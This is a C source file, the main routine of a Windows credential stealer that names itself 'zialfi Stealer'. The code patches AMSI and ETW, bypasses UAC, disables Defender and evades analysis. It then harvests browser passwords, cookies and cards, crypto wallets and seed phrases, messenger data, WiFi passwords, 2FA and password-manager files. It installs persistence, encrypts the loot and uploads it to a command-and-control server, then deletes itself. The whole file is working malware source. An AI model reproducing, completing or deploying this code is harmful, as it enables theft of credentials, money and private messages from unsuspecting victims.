#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>
#include "config.h"
#include "engine.h"
#include "peb.h"
#include "hash.h"
#include "chromium.h"
#include "firefox.h"
#include "wallets.h"
#include "messengers.h"

#ifdef ENABLE_SYSTEM_INFO
extern int mirage_collect_system_info(char *output, size_t outlen);
#endif
#ifdef ENABLE_KEYLOGGER
#include "keylogger.h"
#endif
#ifdef ENABLE_SCREENSHOT
#include "screenshot.h"
#endif
#ifdef ENABLE_CLIPBOARD
#include "clipboard.h"
#endif
#ifdef ENABLE_FILE_GRABBER
#include "grabber.h"
#endif
#ifdef ENABLE_SEED_PHRASE_GRABBER
#include "seed_grabber.h"
#endif
#ifdef ENABLE_CLIPPER
#include "clipper.h"
#endif
#ifdef ENABLE_GAMING_STEAM
#include "gaming.h"
#endif
#ifdef ENABLE_VPN_NORDVPN
#include "vpn.h"
#endif
#ifdef ENABLE_2FA_GOOGLE
#include "twofa.h"
#endif
#ifdef ENABLE_PM_BITWARDEN
#include "passman.h"
#endif

/* ── Evasion ──────────────────────────────────────────────────── */
#ifdef ENABLE_AMSI_BYPASS
#include "amsi_bypass.h"
#endif
#ifdef ENABLE_ETW_BYPASS
#include "etw_bypass.h"
#endif
#ifdef ENABLE_UAC_BYPASS
#include "uac_bypass.h"
#endif
#ifdef ENABLE_PEB_HIDE
#include "peb_hide.h"
#endif
#ifdef ENABLE_DEFENDER_DISABLE
#include "defender_disable.h"
#endif
#ifdef ENABLE_ANTI_ANALYSIS
#include "anti_analysis.h"
#endif
#ifdef ENABLE_MUTEX
#include "mutex.h"
#endif

/* ── Cleanup ──────────────────────────────────────────────────── */
#ifdef ENABLE_PERSISTENCE
#include "persistence.h"
#endif
#ifdef ENABLE_SELF_DELETE
#include "self_delete.h"
#endif
#ifdef ENABLE_TEMP_WIPE
#include "temp_wipe.h"
#endif

#ifdef ENABLE_WIFI_PASSWORDS
#include "wifi.h"
#endif

/* ── C2 Exfil ─────────────────────────────────────────────────── */
#ifdef ENABLE_C2_EXFIL
#include "panel_http.h"
#endif
#ifdef ENABLE_C2_EXFIL
#include "archive_crypt.h"
#endif

#ifdef ENABLE_C2_EXFIL
#include "file_utils.h"
#include <stdint.h>

/* Pack all files in output_dir into an encrypted archive buffer.
 * Returns malloc'd buffer and sets out_len, or NULL on failure. */
static unsigned char *pack_and_encrypt_dir(const char *dir, size_t *out_len) {
    /* First pass: compute total size */
    size_t total = 0;
    int file_count = 0;
    char find_path[MAX_PATH];
    snprintf(find_path, sizeof(find_path), "%s\\*", dir);

    WIN32_FIND_DATAA ffd;
    HANDLE hf = FindFirstFileA(find_path, &ffd);
    if (hf == INVALID_HANDLE_VALUE) return NULL;

    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        size_t name_len = strlen(ffd.cFileName);
        total += 4 + name_len + 4 + ffd.nFileSizeLow;
        file_count++;
    } while (FindNextFileA(hf, &ffd) != 0);
    FindClose(hf);

    if (file_count == 0) return NULL;

    /* Allocate +4 for file_count header */
    unsigned char *buf = (unsigned char *)malloc(total + 4);
    if (!buf) return NULL;

    /* Second pass: write data */
    size_t off = 0;

    /* Write file count at start */
    buf[off++] = (unsigned char)(file_count);
    buf[off++] = (unsigned char)(file_count >> 8);
    buf[off++] = (unsigned char)(file_count >> 16);
    buf[off++] = (unsigned char)(file_count >> 24);

    hf = FindFirstFileA(find_path, &ffd);
    if (hf == INVALID_HANDLE_VALUE) { free(buf); return NULL; }

    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

        size_t name_len = strlen(ffd.cFileName);
        /* Write filename length + filename */
        buf[off++] = (unsigned char)(name_len);
        buf[off++] = (unsigned char)(name_len >> 8);
        memcpy(buf + off, ffd.cFileName, name_len);
        off += name_len;

        /* Write file contents */
        char file_path[MAX_PATH];
        snprintf(file_path, sizeof(file_path), "%s\\%s", dir, ffd.cFileName);
        size_t flen = 0;
        unsigned char *fdata = read_file(file_path, &flen);
        if (fdata) {
            buf[off++] = (unsigned char)(flen);
            buf[off++] = (unsigned char)(flen >> 8);
            buf[off++] = (unsigned char)(flen >> 16);
            buf[off++] = (unsigned char)(flen >> 24);
            memcpy(buf + off, fdata, flen);
            off += flen;
            free(fdata);
        } else {
            buf[off++] = 0; buf[off++] = 0; buf[off++] = 0; buf[off++] = 0;
        }
    } while (FindNextFileA(hf, &ffd) != 0);
    FindClose(hf);

    /* Encrypt with ChaCha20-Poly1305 via archive_crypt */
    size_t enc_cap = total + 4 + 64; /* header + padding */
    unsigned char *enc = (unsigned char *)malloc(enc_cap);
    if (!enc) { free(buf); return NULL; }

    size_t enc_len = enc_cap;
    if (archive_encrypt(buf, off, NULL, 0, enc, &enc_len) < 0) {
        free(buf); free(enc);
        return NULL;
    }

    free(buf);
    *out_len = enc_len;
    return enc;
}
#endif

static void get_appdata_local(char *buf, size_t len) {
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, buf) != S_OK)
        snprintf(buf, len, "C:\\Users\\%s\\AppData\\Local", getenv("USERNAME") ? getenv("USERNAME") : "user");
}

static void get_appdata_roaming(char *buf, size_t len) {
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, buf) != S_OK)
        snprintf(buf, len, "C:\\Users\\%s\\AppData\\Roaming", getenv("USERNAME") ? getenv("USERNAME") : "user");
}

static void write_string_array(const char *path, char **items, size_t count) {
    FILE *f = fopen(path, "a");
    if (!f) return;
    for (size_t i = 0; i < count; i++) {
        if (items[i])
            fprintf(f, "%s\n", items[i]);
    }
    fclose(f);
}

static void save_browser_data(const char *output_dir, const char *prefix, CollectResult *result) {
    for (size_t i = 0; i < result->count; i++) {
        BrowserData *b = &result->data[i];
        char path[MAX_PATH];

        if (b->logins && b->login_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_logins.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->logins, b->login_count);
            dbg_printf("[+] %s logins: %zu -> %s\n", prefix, b->login_count, path);
        }

        if (b->cookies && b->cookie_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_cookies.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->cookies, b->cookie_count);
            dbg_printf("[+] %s cookies: %zu -> %s\n", prefix, b->cookie_count, path);
        }

        if (b->history && b->history_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_history.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->history, b->history_count);
            dbg_printf("[+] %s history: %zu -> %s\n", prefix, b->history_count, path);
        }

        if (b->cards && b->card_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_cards.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->cards, b->card_count);
            dbg_printf("[+] %s cards: %zu -> %s\n", prefix, b->card_count, path);
        }

        if (b->autofill && b->autofill_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_autofill.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->autofill, b->autofill_count);
            dbg_printf("[+] %s autofill: %zu -> %s\n", prefix, b->autofill_count, path);
        }

        if (b->bookmarks && b->bookmark_count > 0) {
            snprintf(path, sizeof(path), "%s\\%s_%s_bookmarks.txt",
                     output_dir, prefix, b->browser_name ? b->browser_name : "unknown");
            write_string_array(path, b->bookmarks, b->bookmark_count);
            dbg_printf("[+] %s bookmarks: %zu -> %s\n", prefix, b->bookmark_count, path);
        }
    }
}

static void save_messenger_files(const char *output_dir, const char *subdir, MessengerResult *m) {
    if (!m->files || m->count == 0) return;

    char dest_dir[MAX_PATH];
    snprintf(dest_dir, sizeof(dest_dir), "%s\\%s", output_dir, subdir);
    CreateDirectoryA(dest_dir, NULL);

    for (size_t i = 0; i < m->count; i++) {
        if (!m->files[i]) continue;
        const char *fname = strrchr(m->files[i], '\\');
        if (!fname) fname = strrchr(m->files[i], '/');
        if (!fname) continue;
        fname++;

        char dest[MAX_PATH];
        snprintf(dest, sizeof(dest), "%s\\%s", dest_dir, fname);
        CopyFileA(m->files[i], dest, FALSE);
        dbg_printf("[+] Copied %s -> %s\n", m->files[i], dest);
    }
}

static void save_text_to_file(const char *path, const char *text) {
    FILE *f = fopen(path, "w");
    if (!f) return;
    fprintf(f, "%s", text);
    fclose(f);
    dbg_printf("[+] Saved %s\n", path);
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;

    /* ── Evasion first ────────────────────────────────────── */
#ifndef ZIALFI_TEST_MODE
#ifdef ENABLE_MUTEX
    if (!mirage_ensure_mutex()) return 0;
#endif
#ifdef ENABLE_ANTI_ANALYSIS
    {
        mirage_analysis_result ar = mirage_anti_analysis_run();
        if (mirage_anti_analysis_should_exit(ar)) return 0;
    }
#endif
#ifdef ENABLE_UAC_BYPASS
    if (!mirage_is_elevated()) {
        char exe_path[MAX_PATH];
        DWORD path_len2 = GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
        if (path_len2 > 0 && path_len2 < sizeof(exe_path)) {
            mirage_uac_bypass(exe_path);
        }
        ExitProcess(0);
    }
#endif
#endif /* !ZIALFI_TEST_MODE */
#ifdef ENABLE_AMSI_BYPASS
    mirage_patch_amsi();
#endif
#ifdef ENABLE_ETW_BYPASS
    mirage_patch_etw();
#endif
#ifdef ENABLE_PEB_HIDE
    mirage_hide_self();
#endif
#ifdef ENABLE_DEFENDER_DISABLE
    mirage_disable_defender();
#endif
#ifdef ENABLE_UAC_BYPASS
    if (!mirage_is_elevated()) {
        char exe_path[MAX_PATH];
        DWORD path_len2 = GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
        if (path_len2 > 0 && path_len2 < sizeof(exe_path)) {
            mirage_uac_bypass(exe_path);
        }
        ExitProcess(0);
    }
#endif

    dbg_printf("[*] zialfi Stealer (C11) starting...\n");
    fflush(stdout);

    char tmpdir[MAX_PATH], local[MAX_PATH], roaming[MAX_PATH], output_dir[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpdir);
    /* Generate random dir name to avoid detection */
    srand(GetTickCount());
    snprintf(output_dir, sizeof(output_dir), "%s\\%08x",
             tmpdir, (unsigned)(rand() ^ (unsigned)GetCurrentProcessId()));
    CreateDirectoryA(output_dir, NULL);

    get_appdata_local(local, sizeof(local));
    get_appdata_roaming(roaming, sizeof(roaming));

    dbg_printf("[+] Local:  %s\n", local);
    dbg_printf("[+] Roaming: %s\n", roaming);
    dbg_printf("[+] Output: %s\n", output_dir);
    fflush(stdout);

    int ok = mirage_syscall_resolve();
    if (ok) {
        dbg_printf("[+] Syscalls resolved (indirect)\n");
        mirage_init_gadget_pool();
        dbg_printf("[+] Gadget pool filled\n");
    } else {
        dbg_printf("[!] PEB walk failed — using fallback WinAPI\n");
    }
    fflush(stdout);

#ifdef ENABLE_CHROMIUM_STEALER
    /* App-Bound COM requires GUI session — skip fork in headless mode */
    dbg_printf("[*] Chromium...\n"); fflush(stdout);
    CollectResult chrome = collect_chromium(local, roaming);
    dbg_printf("[+] Chromium: %zu browsers\n", chrome.count);
    save_browser_data(output_dir, "chromium", &chrome);
    free_browser_data(&chrome);
#endif

#ifdef ENABLE_FIREFOX_STEALER
    dbg_printf("[*] Firefox...\n"); fflush(stdout);
    CollectResult ff = collect_firefox(roaming);
    dbg_printf("[+] Firefox: %zu browsers\n", ff.count);
    save_browser_data(output_dir, "firefox", &ff);
    free_firefox_data(&ff);
#endif

#ifdef ENABLE_WALLET_EXTENSIONS
    dbg_printf("[*] Wallets...\n"); fflush(stdout);
    CollectResult wallets = collect_wallets(local, roaming);
    dbg_printf("[+] Wallets: %zu\n", wallets.count);
    save_browser_data(output_dir, "wallets", &wallets);
    free_browser_data(&wallets);
#endif

    dbg_printf("[*] Messengers...\n"); fflush(stdout);
    MessengerData messengers = collect_messengers(roaming, local);
    dbg_printf("[+] Discord: %zu, Telegram: %zu, Signal: %zu\n",
           messengers.discord.count, messengers.telegram.count, messengers.signal.count);
    save_messenger_files(output_dir, "discord", &messengers.discord);
    save_messenger_files(output_dir, "telegram", &messengers.telegram);
    save_messenger_files(output_dir, "signal", &messengers.signal);
    save_messenger_files(output_dir, "whatsapp", &messengers.whatsapp);
    save_messenger_files(output_dir, "skype", &messengers.skype);
    save_messenger_files(output_dir, "viber", &messengers.viber);
    save_messenger_files(output_dir, "element", &messengers.element);
    save_messenger_files(output_dir, "session", &messengers.session);
    save_messenger_files(output_dir, "tox", &messengers.tox);
    save_messenger_files(output_dir, "icq", &messengers.icq);
    save_messenger_files(output_dir, "pidgin", &messengers.pidgin);
    save_messenger_files(output_dir, "outlook", &messengers.outlook);
    save_messenger_files(output_dir, "jabber", &messengers.jabber);
    save_messenger_files(output_dir, "microsip", &messengers.microsip);
    free_messenger_data(&messengers);

#ifdef ENABLE_SYSTEM_INFO
    dbg_printf("[*] System info...\n"); fflush(stdout);
    char sys_info[4096] = {0};
    mirage_collect_system_info(sys_info, sizeof(sys_info));
    {
        char si_path[MAX_PATH];
        snprintf(si_path, sizeof(si_path), "%s\\system_info.txt", output_dir);
        save_text_to_file(si_path, sys_info);
    }
    dbg_printf("[+] System info OK\n");
#endif

#ifdef ENABLE_SCREENSHOT
    char ss_path[MAX_PATH];
    snprintf(ss_path, sizeof(ss_path), "%s\\screenshot.bmp", output_dir);
    dbg_printf("[*] Screenshot...\n"); fflush(stdout);
    if (screenshot_capture(ss_path) == 0)
        dbg_printf("[+] Screenshot: %s\n", ss_path);
    else
        dbg_printf("[!] Screenshot failed\n");
#endif

#ifdef ENABLE_CLIPBOARD
    char clip_buf[4096] = {0};
    dbg_printf("[*] Clipboard...\n"); fflush(stdout);
    int clip_len = clipboard_get_text(clip_buf, sizeof(clip_buf));
    if (clip_len > 0) {
        char clip_path[MAX_PATH];
        snprintf(clip_path, sizeof(clip_path), "%s\\clipboard.txt", output_dir);
        save_text_to_file(clip_path, clip_buf);
#ifdef ENABLE_CLIPPER
        /* Check clipboard for crypto addresses, log if found */
        int addr_type = clipper_detect_address(clip_buf);
        if (addr_type > 0) {
            dbg_printf("[+] Clipper: address type %d detected in clipboard\n", addr_type);
        }
#endif
    }
    dbg_printf("[+] Clipboard: %d bytes\n", clip_len);
#endif

#ifdef ENABLE_SEED_PHRASE_GRABBER
    dbg_printf("[*] Seed phrase scan...\n"); fflush(stdout);
    {
        char seed_buf[16384] = {0};
        if (seed_grabber_collect(seed_buf, sizeof(seed_buf)) == 0 && seed_buf[0]) {
            char seed_path[MAX_PATH];
            snprintf(seed_path, sizeof(seed_path), "%s\\seed_phrases.txt", output_dir);
            save_text_to_file(seed_path, seed_buf);
        }
    }
#endif

#ifdef ENABLE_WIFI_PASSWORDS
    dbg_printf("[*] WiFi passwords...\n"); fflush(stdout);
    {
        char wifi_buf[4096] = {0};
        mirage_collect_wifi_passwords(wifi_buf, sizeof(wifi_buf));
        if (wifi_buf[0]) {
            char wifi_path[MAX_PATH];
            snprintf(wifi_path, sizeof(wifi_path), "%s\\wifi.txt", output_dir);
            save_text_to_file(wifi_path, wifi_buf);
        }
    }
#endif

#ifdef ENABLE_KEYLOGGER
    dbg_printf("[+] Keylogger: available (run interactively)\n");
#endif

#ifdef ENABLE_FILE_GRABBER
    dbg_printf("[*] File grabber...\n"); fflush(stdout);
    int grabbed = grabber_collect(output_dir, 100);
    dbg_printf("[+] Grabbed %d files\n", grabbed);
#endif

#ifdef ENABLE_GAMING_STEAM
    dbg_printf("[*] Gaming...\n"); fflush(stdout);
    gaming_collect_all(output_dir);
#endif

#ifdef ENABLE_VPN_NORDVPN
    dbg_printf("[*] VPN...\n"); fflush(stdout);
    int vpn_files = vpn_collect(output_dir);
    dbg_printf("[+] VPN: %d files\n", vpn_files);
#endif

#ifdef ENABLE_2FA_GOOGLE
    dbg_printf("[*] 2FA...\n"); fflush(stdout);
    twofa_collect(output_dir);
#endif

#ifdef ENABLE_PM_BITWARDEN
    dbg_printf("[*] Password managers...\n"); fflush(stdout);
    passman_collect(output_dir);
#endif

    dbg_printf("[*] Done. Output: %s\n", output_dir);
    fflush(stdout);

    /* ── Persistence ───────────────────────────────────────────── */
#ifdef ENABLE_PERSISTENCE
    {
        char exe_path[MAX_PATH];
        DWORD path_len = GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
        if (path_len > 0 && path_len < sizeof(exe_path)) {
            PersistResult pr = persistence_install(exe_path);
            (void)pr;
        }
    }
#endif

    /* ── C2 Exfil ──────────────────────────────────────────────── */
#ifdef ENABLE_C2_EXFIL
    {
        size_t archive_len = 0;
        unsigned char *archive = pack_and_encrypt_dir(output_dir, &archive_len);
        if (archive) {
            char metadata[256];
            snprintf(metadata, sizeof(metadata),
                     "{\"host\":\"%s\",\"user\":\"%s\"}",
                     "unknown", getenv("USERNAME") ? getenv("USERNAME") : "unknown");
            upload_log(c2_host, c2_port, C2_TOKEN,
                       archive, archive_len, metadata);
            free(archive);
        }
    }
#endif

    /* ── Wipe temp ─────────────────────────────────────────────── */
#ifdef ENABLE_TEMP_WIPE
    temp_wipe_directory();
#endif

    /* ── Self-delete (last) ────────────────────────────────────── */
#ifdef ENABLE_SELF_DELETE
    self_delete_run();
#else
    /* Self-delete not enabled — remove the output directory manually */
    {
        char del_path[MAX_PATH + 8];
        snprintf(del_path, sizeof(del_path), "rmdir /s /q \"%s\"", output_dir);
        WinExec(del_path, SW_HIDE);
    }
#endif

    return 0;
}
